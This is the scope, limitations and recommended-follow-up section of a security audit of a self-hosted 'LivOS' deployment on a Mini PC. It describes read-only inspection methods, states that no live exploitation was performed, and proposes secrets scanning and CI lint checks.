- Live inspection of the production Mini PC (`bruce@10.69.31.68` / `192.168.20.33`): `ss`/UFW port exposure, `docker inspect` mounts (OpenHands, OpenDesign, auth-server), and `stat`/`namei` on `/opt/livos/data/secrets/*` and `/etc/caddy/Caddyfile`.
- Adversarial verification: each finding was re-checked against the actual code with explicit refutation attempts; severities were calibrated down where mitigations (loopback binds, default-prod config, single-operator topology, SameSite=Lax) genuinely reduce reach.

**NOT covered / limitations:**
- **No live exploitation was performed.** Exploit chains are demonstrated by code/configuration analysis only. No JWT was forged, no container was escaped, no credential was read off the live box.
- Some live findings (LIVOS-003/015/016/017/022/039 and the auth-server over-mount) were captured by earlier `docker inspect`/`ss`/`stat` runs and **were not re-executed during write-up** (sudo-gated, single production box). Each was cross-checked against the provisioning code; the auth-server whole-`/data` over-mount (`legacy-compat/docker-compose.yml:33-34`) is noted in passing but not assigned a top-level ID here.
- Server4 and Server5 (relay/store) were treated as out-of-scope for LivOS hardening per operator policy, except where committed credentials in the repo (LIVOS-021/032) touch them.
- The multi-user mode is an optional, non-default toggle on the Mini PC; several High/Medium auth findings (LIVOS-004/005/006/007/022/027) become actively exploitable when it is enabled with untrusted accounts. They are reported at their multi-user severity because the feature ships and is one toggle away.

**Recommended follow-ups:**
- A focused re-test on a disposable VPS with multi-user mode enabled and a deliberately-malicious marketplace app to live-validate LIVOS-001/007/008/013 end to end.
- A secrets sweep (gitleaks/trufflehog) across the full history, not just HEAD, given the cluster of committed credentials (LIVOS-020/021/030/031/032).
- Add CI gates: a compose-lint that fails on `privileged`/`docker.sock`/host-mounts in non-builtin manifests, and a unit test asserting `requireApiKey` rejects when LIV_API_KEY is unset.
